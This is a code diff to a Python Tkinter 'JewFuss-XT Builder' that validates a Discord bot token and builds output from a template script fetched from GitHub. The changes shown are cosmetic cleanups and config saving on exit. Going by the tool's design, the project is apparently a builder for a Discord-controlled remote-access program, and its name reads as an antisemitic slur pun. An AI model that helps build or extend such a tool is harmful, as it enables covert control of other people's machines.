@@ -3,13 +3,13 @@ import tempfile, shutil, json, time, sys, os, re
 from tkinter import ttk, filedialog, messagebox
 from PIL import Image, ImageTk
 
-BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
-DATA_DIR    = os.path.join(BASE_DIR, 'data')
-OUTPUT_DIR  = os.path.join(BASE_DIR, 'builds')
-TEMPLATE    = os.path.join(BASE_DIR, 'JewFuss-XT.py')
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+DATA_DIR = os.path.join(BASE_DIR, 'data')
+OUTPUT_DIR = os.path.join(BASE_DIR, 'builds')
+TEMPLATE = os.path.join(BASE_DIR, 'JewFuss-XT.py')
 CONFIG_PATH = os.path.join(DATA_DIR, 'config.json')
-LOG_FILE    = os.path.join(OUTPUT_DIR, 'easy-compiler-build.log')
-LATEST      = "https://raw.githubusercontent.com/gabrielzv1233/JewFuss-XT/refs/heads/main/JewFuss-XT.py"
+LOG_FILE = os.path.join(OUTPUT_DIR, 'easy-compiler-build.log')
+LATEST = "https://raw.githubusercontent.com/gabrielzv1233/JewFuss-XT/refs/heads/main/JewFuss-XT.py"
 RECOMMENDED = (3,11,9)
 
 class BuilderUI(tk.Tk):
@@ -18,6 +18,8 @@ class BuilderUI(tk.Tk):
         self.title("JewFuss-XT Builder")
         self.geometry("900x360")
         self.minsize(900, 360)
+
+        self.protocol("WM_DELETE_WINDOW", lambda: (self.save_config(), self.destroy()))
 
         self.columnconfigure(0, weight=1)
         self.rowconfigure(0, weight=1)
@@ -31,7 +33,7 @@ class BuilderUI(tk.Tk):
         self.bot_username = None
         self.bot_id = None
 
-        self.token_label_var = tk.StringVar(value="Bot token: (Invalid)")  # MODIFIED
+        self.token_label_var = tk.StringVar(value="Bot token: (Invalid)")
 
         self.load_config()
         self.create_widgets()
@@ -46,7 +48,7 @@ class BuilderUI(tk.Tk):
         frm.grid(row=0, column=0, sticky="nsew")
         frm.columnconfigure(0, weight=1)
 
-        self.token_label = ttk.Label(frm, textvariable=self.token_label_var)  # MODIFIED
+        self.token_label = ttk.Label(frm, textvariable=self.token_label_var)
         self.token_label.grid(row=0, column=0, sticky="w")
 
         self.token_var = tk.StringVar(value=self.config.get("token",""))
@@ -107,7 +109,7 @@ class BuilderUI(tk.Tk):
             self._validate_token_thread()
         else:
             self.after(0, lambda: self.token_err.set("Invalid format"))
-            self.after(0, lambda: self.token_label_var.set("Bot token: (Invalid)"))  # MODIFIED
+            self.after(0, lambda: self.token_label_var.set("Bot token: (Invalid)"))
             self.after(0, self.update_build_state)
 
     def on_token_change(self):
@@ -117,7 +119,7 @@ class BuilderUI(tk.Tk):
             self._validate_token_thread()
         else:
             self.token_err.set("Invalid format")
-            self.token_label_var.set("Bot token: (Invalid)")  # MODIFIED
+            self.token_label_var.set("Bot token: (Invalid)")
             self.token_valid = False
             self.update_build_state()
 
@@ -136,17 +138,17 @@ class BuilderUI(tk.Tk):
                     self.bot_username = f"{info['username']}#{info['discriminator']}"
                     self.bot_id = info['id']
                     self.token_valid = True
-                    self.after(0, lambda: self.token_label_var.set(f"Bot token: ({self.bot_username})"))  # MODIFIED
+                    self.after(0, lambda: self.token_label_var.set(f"Bot token: ({self.bot_username})"))
                     msg = ""
                 else:
                     self.token_valid = False
-                    self.after(0, lambda: self.token_label_var.set("Bot token: (Invalid)"))  # MODIFIED
+                    self.after(0, lambda: self.token_label_var.set("Bot token: (Invalid)"))
                     msg = f"Invalid token ({r.status_code})"
                 self.after(0, lambda: self.token_err.set(msg))
             except Exception as e:
                 self.token_valid = False
                 print("Token validation error:", e)
-                self.after(0, lambda: self.token_label_var.set("Bot token: (Invalid)"))  # MODIFIED
+                self.after(0, lambda: self.token_label_var.set("Bot token: (Invalid)"))
                 self.after(0, lambda: self.token_err.set("API error"))
             self.after(0, self.update_build_state)
 
@@ -301,4 +303,9 @@ class BuilderUI(tk.Tk):
         self.after(0, self.enable_inputs)
 
 if __name__ == "__main__":
-    BuilderUI().mainloop()
+    app = BuilderUI()
+    try:
+        app.mainloop()
+    except KeyboardInterrupt:
+        app.save_config()
+        sys.exit(0)
